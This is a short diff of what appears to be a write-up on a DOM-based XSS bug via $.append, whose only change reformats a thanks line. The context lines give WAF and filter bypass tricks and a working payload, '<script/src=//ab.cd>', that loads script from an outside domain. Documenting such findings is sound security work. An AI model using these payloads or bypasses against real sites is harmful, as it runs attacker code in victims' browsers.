@@ -58,4 +58,4 @@ DOM XSS via $.append(<PAYLOAD>)
 1. WAF: <script> blocked but <script/a> isn’t (lol)
 2. All uppercased: Instead of direct JS (ALERT isn’t valid), use <script/src>
 3. 20 char limit(!!): Used my 5 char domain <script/src=//ab.cd> 
-  ***thank to [@spaceracoon](https://twitter.com/spaceraccoonsec)
+***thanks to [@spaceracoon](https://twitter.com/spaceraccoonsec)***
